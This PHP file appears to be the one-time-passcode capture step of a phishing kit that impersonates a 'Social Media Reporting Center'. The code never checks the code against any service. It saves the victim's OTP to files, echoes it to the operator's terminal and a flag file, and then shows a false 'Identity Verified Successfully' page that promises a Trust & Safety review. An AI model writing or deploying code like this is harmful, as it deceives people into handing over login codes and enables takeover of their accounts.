<?php
/* ================================================================
   templates/social_reporting/otp_verify.php
   Social Media Reporting Center — OTP Verification Handler
   Appends OTP to submission file, saves separate OTP file,
   logs to terminal, returns a confirmation HTML page.
   ================================================================ */

header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');

/* ── Only POST ───────────────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method not allowed.');
}

/* ── Sanitise helper ─────────────────────────────────────────── */
function smr_otp_clean(string $v): string {
    return htmlspecialchars(strip_tags(trim($v)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/* ── Read inputs ─────────────────────────────────────────────── */
$otp_value     = smr_otp_clean($_POST['otp_value']     ?? '');
$submission_id = smr_otp_clean($_POST['submission_id'] ?? '');
$platform_group = smr_otp_clean($_POST['platform_group'] ?? '');

/* ── Basic validation ────────────────────────────────────────── */
$errors = [];

$otp_digits = preg_replace('/\s/', '', $otp_value);
if (!preg_match('/^\d{4,8}$/', $otp_digits)) {
    $errors[] = 'Please enter a valid 4–8 digit verification code.';
}

/* Validate submission_id (basename only — no path traversal) */
$safe_id = basename($submission_id);
if (empty($safe_id) || !preg_match('/^social_reporting_submission_\d{8}_\d{6}_[a-f0-9]{6}\.txt$/', $safe_id)) {
    // ID is missing or malformed — still process OTP but skip file append
    $safe_id = null;
}

/* If there are validation errors, redisplay form with error */
if (!empty($errors)) {
    smr_otp_render_error(implode(' ', $errors));
    exit;
}

/* ── Path setup ──────────────────────────────────────────────── */
// Data directories at the project-level data/ folder.
$project_root    = realpath(__DIR__ . '/../../') ?: dirname(__DIR__, 2);
$globalDataDir   = $project_root . '/data';
$submissions_dir = $globalDataDir . '/submissions';
$otps_dir        = $globalDataDir . '/otps';

// Ensure directories exist and are writable
foreach ([$submissions_dir, $otps_dir] as $_d) {
    if (!is_dir($_d) && !mkdir($_d, 0750, true)) {
        error_log("SMR: failed to create dir $_d");
        http_response_code(500);
        exit('Internal error — storage unavailable.');
    }
    if (!is_writable($_d)) {
        error_log("SMR: not writable: $_d");
        http_response_code(500);
        exit('Internal error — storage unavailable.');
    }
}
unset($_d);

$timestamp      = date('Ymd_His');
$suffix         = substr(bin2hex(random_bytes(4)), 0, 6);
$divider        = str_repeat('-', 52);

/* ── Append OTP to existing submission file ──────────────────── */
if ($safe_id) {
    $sub_file = $submissions_dir . '/' . $safe_id;
    /* Verify resolved path is within submissions_dir (anti-traversal) */
    $realSubDir = realpath($submissions_dir);
    $realSubFile = realpath($sub_file);
    if ($realSubDir !== false && $realSubFile !== false
        && strpos($realSubFile, $realSubDir . DIRECTORY_SEPARATOR) === 0
        && is_file($realSubFile)) {
        $append = "\n" . $divider . "\n"
                . "OTP VERIFICATION\n"
                . 'Verified At : ' . date('Y-m-d H:i:s T') . "\n"
                . 'OTP Code    : ' . $otp_digits . "\n"
                . $divider . "\n";

        $fp = fopen($realSubFile, 'a');
        if ($fp) {
            flock($fp, LOCK_EX);
            fwrite($fp, $append);
            flock($fp, LOCK_UN);
            fclose($fp);
        }
        error_log('SMR: OTP appended to ' . $realSubFile);
    } else {
        error_log('SMR: submission file not found or traversal blocked: ' . $sub_file);
    }
}

/* ── Save separate OTP file ──────────────────────────────────── */
$otp_file_name = sprintf('social_reporting_otp_%s_%s.txt', $timestamp, $suffix);
$otp_file_path = $otps_dir . '/' . $otp_file_name;

$otp_record = implode("\n", [
    $divider,
    'SOCIAL MEDIA REPORTING CENTER — OTP Record',
    'Timestamp     : ' . date('Y-m-d H:i:s T'),
    'OTP Code      : ' . $otp_digits,
    'Submission ID : ' . ($safe_id ?? '(not linked)'),
    'Platform Group: ' . ($platform_group ?: '—'),
    $divider,
    '',
]);

$fp = fopen($otp_file_path, 'x');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $otp_record);
    flock($fp, LOCK_UN);
    fclose($fp);
    @chmod($otp_file_path, 0640);
}

error_log('SMR: OTP record written to ' . $otp_file_path);

/* ── Terminal / log output ───────────────────────────────────── */
$log_msg = "\n" . $divider . "\n"
         . "[SMR] OTP Verification Received\n"
         . $divider . "\n"
         . 'OTP Code      : ' . $otp_digits . "\n"
         . 'Submission ID : ' . ($safe_id ?? '(unlinked)') . "\n"
         . 'OTP File      : ' . $otp_file_name . "\n"
         . 'Time          : ' . date('Y-m-d H:i:s T') . "\n"
         . $divider . "\n";

error_log($log_msg);
file_put_contents('php://stderr', $log_msg);

/* ── Signal shell flag ───────────────────────────────────────── */
$flag_path = $globalDataDir . '/.flag_form';
file_put_contents($flag_path, $log_msg);

/* ── Render confirmation page ────────────────────────────────── */
smr_otp_render_success();
exit;

/* ================================================================
   Page renderers
   ================================================================ */

function smr_otp_render_success(): void {
?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Complete — Social Media Reporting Center</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>body { font-family: 'Inter', sans-serif; }</style>
</head>
<body class="min-h-screen bg-gradient-to-br from-blue-50 to-slate-100 flex items-center justify-center p-6">

  <div class="max-w-xl w-full mx-auto bg-white rounded-2xl shadow-lg p-8 text-center space-y-6">

    <!-- Success icon -->
    <div class="flex justify-center">
      <div class="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center">
        <svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" stroke-width="2.5"
             viewBox="0 0 24 24" aria-hidden="true">
          <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
        </svg>
      </div>
    </div>

    <!-- Title and description -->
    <div class="space-y-2">
      <h1 class="text-3xl font-semibold text-gray-900">Identity Verified Successfully</h1>
      <p class="text-base text-gray-600 leading-relaxed">
        Your verification code has been confirmed. Your report has been logged
        and escalated to our Trust &amp; Safety Review team.
      </p>
    </div>

    <!-- What happens next -->
    <div class="bg-slate-50 rounded-xl p-5 text-left space-y-3">
      <p class="text-sm font-semibold text-gray-700">What happens next?</p>
      <ul class="space-y-2.5">
        <li class="flex items-start gap-3 text-sm text-gray-600">
          <span class="mt-0.5 flex-shrink-0 w-5 h-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center text-xs font-bold">1</span>
          <span>Our team will review your report within <strong class="text-gray-800">24–48 hours</strong>.</span>
        </li>
        <li class="flex items-start gap-3 text-sm text-gray-600">
          <span class="mt-0.5 flex-shrink-0 w-5 h-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center text-xs font-bold">2</span>
          <span>If further information is required, you will be contacted via your registered details.</span>
        </li>
        <li class="flex items-start gap-3 text-sm text-gray-600">
          <span class="mt-0.5 flex-shrink-0 w-5 h-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center text-xs font-bold">3</span>
          <span>Confirmed violations will result in immediate enforcement action on the reported account.</span>
        </li>
      </ul>
    </div>

    <!-- Reference ID -->
    <p class="text-sm text-gray-500">
      Reference ID:
      <code class="bg-slate-100 px-2 py-0.5 rounded font-mono text-xs text-gray-600">
        <?php echo htmlspecialchars(date('Ymd') . '-' . strtoupper(substr(bin2hex(random_bytes(3)), 0, 6)), ENT_QUOTES, 'UTF-8'); ?>
      </code>
    </p>

  </div>

</body>
</html>
<?php
}

function smr_otp_render_error(string $error_msg): void {
?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Error — Social Media Reporting Center</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets.css">
</head>
<body class="smr-root">
<div class="smr-container" style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding-top:0;padding-bottom:0;">
  <div style="padding:2.5rem;max-width:480px;width:100%;text-align:center;background:#ffffff;border:1px solid #e2e8f0;border-radius:1rem;box-shadow:0 10px 28px rgba(15,23,42,0.12);">

    <div style="display:inline-flex;width:5rem;height:5rem;border-radius:50%;
                background:rgba(239,68,68,0.12);border:2px solid rgba(239,68,68,0.3);
                align-items:center;justify-content:center;margin-bottom:1.5rem;">
      <svg style="width:2.5rem;height:2.5rem;color:#f87171;" fill="none" stroke="currentColor"
           stroke-width="2.5" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
      </svg>
    </div>

    <h1 style="font-size:1.375rem;font-weight:700;color:#0f172a;margin:0 0 0.625rem;">
      Verification Failed
    </h1>
    <p style="font-size:0.875rem;color:#475569;line-height:1.7;margin:0 0 1.25rem;">
      <?php echo htmlspecialchars($error_msg, ENT_QUOTES, 'UTF-8'); ?>
    </p>
    <a href="index.php"
       style="display:inline-block;padding:0.75rem 1.75rem;background:linear-gradient(135deg,#dc2626,#7f1d1d);
              color:#fff;font-size:0.875rem;font-weight:600;border-radius:0.875rem;
              text-decoration:none;box-shadow:0 4px 18px rgba(185,28,28,0.42);
              transition:transform 0.18s ease,box-shadow 0.18s ease;">
      &larr; Return and Try Again
    </a>
  </div>
</div>
</body>
</html>
<?php
}
